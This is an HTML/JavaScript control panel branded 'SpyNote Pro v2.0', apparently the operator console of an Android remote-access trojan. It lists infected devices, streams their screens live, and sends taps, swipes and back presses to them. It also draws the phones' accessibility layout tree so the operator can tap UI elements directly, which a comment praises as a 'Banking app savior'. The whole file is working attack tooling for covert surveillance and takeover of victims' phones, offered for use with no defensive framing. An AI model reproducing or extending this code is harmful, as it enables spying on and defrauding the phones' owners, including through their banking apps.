<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Pro - Layout Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        
        #top-panel {
            position: fixed; top: 0; left: 0; right: 0; height: 60px; 
            background: rgba(0,0,0,0.9); backdrop-filter: blur(20px);
            display: flex; align-items: center; padding: 0 20px; z-index: 1000;
        }
        
        #devices {
            width: 280px; max-height: calc(100vh - 120px); overflow-y: auto;
            background: rgba(0,0,0,0.95); padding: 20px; border-radius: 0 0 15px 15px;
            backdrop-filter: blur(20px); margin-right: 20px;
        }
        
        .device { 
            padding: 15px; margin: 10px 0; background: #2a2a3a; cursor: pointer; 
            border-radius: 12px; transition: all 0.3s; border: 2px solid transparent;
            position: relative; overflow: hidden;
        }
        .device:hover { background: #3a3a4a; transform: translateX(5px); border-color: #00ff88; }
        .device.active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; 
            color: #000; border-color: #00ff88; box-shadow: 0 0 20px #00ff88; }
        .disconnected { opacity: 0.5; }
        
        #phone-container {
            flex: 1; display: flex; justify-content: center; align-items: center;
            height: calc(100vh - 120px); position: relative;
        }
        
        #phone-frame {
            width: 380px; height: 820px; background: #1a1a1a; 
            border: 30px solid #2a2a3a; border-radius: 60px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
            transition: all 0.3s;
        }
        
        #phone-frame.fullscreen {
            width: 100vw; height: 100vh; border: none; border-radius: 0;
            margin: 0; position: fixed; top: 0; left: 0; z-index: 2000;
        }
        
        #screen-canvas { 
            width: 100%; height: 100%; background: #111; border-radius: 25px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
        }
        
        /* üî• LAYOUT OVERLAY */
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; border-radius: 25px; z-index: 10;
        }
        .layout-node {
            position: absolute; border: 2px solid rgba(0,255,136,0.6); 
            background: rgba(0,255,136,0.1); border-radius: 4px;
            transition: all 0.2s; cursor: pointer;
            backdrop-filter: blur(2px);
        }
        .layout-node:hover {
            border-color: #00ff88 !important; background: rgba(0,255,136,0.3) !important;
            box-shadow: 0 0 10px rgba(0,255,136,0.5);
        }
        .layout-node.active {
            border-color: #ff4444 !important; background: rgba(255,68,68,0.4) !important;
            box-shadow: 0 0 20px rgba(255,68,68,0.8);
        }
        
        #control-panel {
            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
            display: flex; gap: 15px; z-index: 1000;
        }
        
        .control-btn {
            padding: 18px 25px; background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; border-radius: 30px; cursor: pointer;
            font-size: 16px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 8px 25px rgba(102,126,234,0.4);
            min-width: 80px;
        }
        .control-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(102,126,234,0.6); }
        .control-btn.danger { background: linear-gradient(45deg, #ff6b6b, #ee5a52); }
        .control-btn.success { background: linear-gradient(45deg, #00ff88, #00cc6a); }
        
        #status-bar {
            position: fixed; top: 70px; right: 20px; background: rgba(0,0,0,0.8);
            padding: 15px; border-radius: 10px; font-size: 13px; min-width: 200px;
        }
        
        #layout-toggle {
            position: fixed; top: 20px; right: 20px; z-index: 1500;
            background: rgba(0,0,0,0.8); color: #00ff88; border: 2px solid #00ff88;
            padding: 10px 20px; border-radius: 25px; cursor: pointer; font-weight: bold;
        }
    </style>
</head>
<body>
    <div id="top-panel">
        <div id="devices">
            <h3 style="margin-bottom: 20px;">üì± Connected Devices</h3>
            <div id="device-list">Loading devices...</div>
        </div>
        
        <div style="flex: 1; text-align: center;">
            <div style="font-size: 18px; font-weight: bold;">SpyNote Pro v2.0</div>
            <div style="font-size: 12px; opacity: 0.8;">Layout Control + 30FPS</div>
        </div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div>Layout Nodes: <span id="nodeCount">0</span> | Mode: <span id="controlMode">Visual</span></div>
    </div>
    
    <button id="layout-toggle" onclick="toggleLayout()">üñºÔ∏è Layout OFF</button>
    
    <div id="phone-container">
        <div id="phone-frame">
            <canvas id="screen-canvas"></canvas>
            <canvas id="layout-overlay"></canvas>
        </div>
    </div>
    
    <div id="control-panel">
        <button class="control-btn danger" onclick="sendBack()">üîô Back</button>
        <button class="control-btn" onclick="toggleLayoutOverlay()">üñºÔ∏è Toggle Layout</button>
        <button class="control-btn" onclick="toggleFullScreen()">üì± Fullscreen</button>
        <button class="control-btn success" onclick="toggleControlMode()">üéØ Layout Mode</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let layoutVisible = false;
        let layoutNodes = [];
        let controlMode = 'visual'; // 'visual' or 'layout'
        
        const canvas = document.getElementById('screen-canvas');
        const ctx = canvas.getContext('2d');
        const overlayCanvas = document.getElementById('layout-overlay');
        const overlayCtx = overlayCanvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        
        // Status elements
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const nodeCount = document.getElementById('nodeCount');
        const controlModeDisplay = document.getElementById('controlMode');
        const layoutToggle = document.getElementById('layout-toggle');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        // üî• PERFECT FRAME + LAYOUT HANDLING
        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                layoutNodes = data.layout || [];
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    overlayCanvas.width = rect.width;
                    overlayCanvas.height = rect.height;
                    
                    // Perfect screen rendering
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    // Update FPS
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        fpsDisplay.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                    
                    // üî• DRAW LAYOUT OVERLAY
                    if (layoutVisible) {
                        drawLayoutOverlay();
                    }
                    
                    nodeCount.textContent = layoutNodes.length;
                };
                
                img.src = 'data:image/jpeg;base64,' + data.imageData;
            } catch (e) {
                console.error('Frame error:', e);
            }
        });

        function drawLayoutOverlay() {
            overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
            
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            
            layoutNodes.forEach((node, index) => {
                try {
                    const bounds = node.bounds;
                    const x = (bounds.left / scaleX);
                    const y = (bounds.top / scaleY);
                    const w = ((bounds.right - bounds.left) / scaleX);
                    const h = ((bounds.bottom - bounds.top) / scaleY);
                    
                    overlayCtx.strokeStyle = 'rgba(0,255,136,0.7)';
                    overlayCtx.lineWidth = 2;
                    overlayCtx.fillStyle = 'rgba(0,255,136,0.15)';
                    overlayCtx.fillRect(x, y, w, h);
                    overlayCtx.strokeRect(x, y, w, h);
                    
                    // Text label
                    overlayCtx.fillStyle = 'rgba(0,0,0,0.8)';
                    overlayCtx.fillRect(x, y - 20, 100, 18);
                    overlayCtx.fillStyle = '#00ff88';
                    overlayCtx.font = '12px Arial';
                    overlayCtx.fillText(`${index}`, x + 5, y - 6);
                    
                } catch (e) {}
            });
        }

        // üî• PERFECT TOUCH/SCALE CONTROL
        let startX = 0, startY = 0, dragging = false;
        
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Visual tapping
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
                dragging = true;
                
                if (controlMode === 'visual') {
                    sendVisualTap(coords.x, coords.y);
                }
            });
        });

        // üî• LAYOUT-BASED TAPPING (Banking app savior!)
        phoneFrame.addEventListener('click', e => {
            if (controlMode === 'layout' && layoutVisible) {
                e.preventDefault();
                const rect = phoneFrame.getBoundingClientRect();
                const scaleX = deviceWidth / rect.width;
                const scaleY = deviceHeight / rect.height;
                
                const clientX = e.clientX - rect.left;
                const clientY = e.clientY - rect.top;
                
                // Find nearest layout node
                let nearestNode = null;
                let minDist = Infinity;
                
                layoutNodes.forEach(node => {
                    const bounds = node.bounds;
                    const nodeX = bounds.centerX / scaleX;
                    const nodeY = bounds.centerY / scaleY;
                    const dist = Math.hypot(clientX - nodeX, clientY - nodeY);
                    
                    if (dist < minDist && dist < 50) { // Within 50px radius
                        minDist = dist;
                        nearestNode = node;
                    }
                });
                
                if (nearestNode) {
                    sendLayoutTap(nearestNode);
                }
            }
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendVisualTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'tap', 
                x, y 
            });
        }

        function sendLayoutTap(node) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'layout-tap', 
                nodeId: JSON.stringify(node),
                bounds: node.bounds
            });
            console.log('üéØ Layout tap:', node);
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, 
                action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleLayoutOverlay() {
            layoutVisible = !layoutVisible;
            layoutToggle.textContent = layoutVisible ? 'üñºÔ∏è Layout ON' : 'üñºÔ∏è Layout OFF';
            if (layoutVisible) drawLayoutOverlay();
            else overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
        }

        function toggleControlMode() {
            controlMode = controlMode === 'visual' ? 'layout' : 'visual';
            controlModeDisplay.textContent = controlMode.toUpperCase();
            phoneFrame.style.cursor = controlMode === 'layout' ? 'crosshair' : 'pointer';
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
                phoneFrame.classList.add('fullscreen');
            } else {
                document.exitFullscreen();
                phoneFrame.classList.remove('fullscreen');
            }
        }

        // Devices
        fetch('/devices').then(r => r.json()).then(devices => updateDeviceList(devices));
        socket.on('devices-update', devices => updateDeviceList(devices));

        function updateDeviceList(devices) {
            document.getElementById('device-list').innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)"
                         title="${info.model || id}">
                        <b>${info.model?.slice(0,15) || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small><br>
                        <span style="font-size: 11px;">${info.screenWidth || ''}x${info.screenHeight || ''}</span>
                        ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                    </div>
                `).join('') : 'No devices found';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('select-device', { deviceId });
        }

        // Keyboard shortcuts
        document.addEventListener('keydown', e => {
            if (e.key === 'b' || e.key === 'B') sendBack();
            if (e.key === 'l' || e.key === 'L') toggleLayoutOverlay();
            if (e.key === 'f' || e.key === 'F') toggleFullScreen();
            if (e.key === 'm' || e.key === 'M') toggleControlMode();
        });
    </script>
</body>
</html>
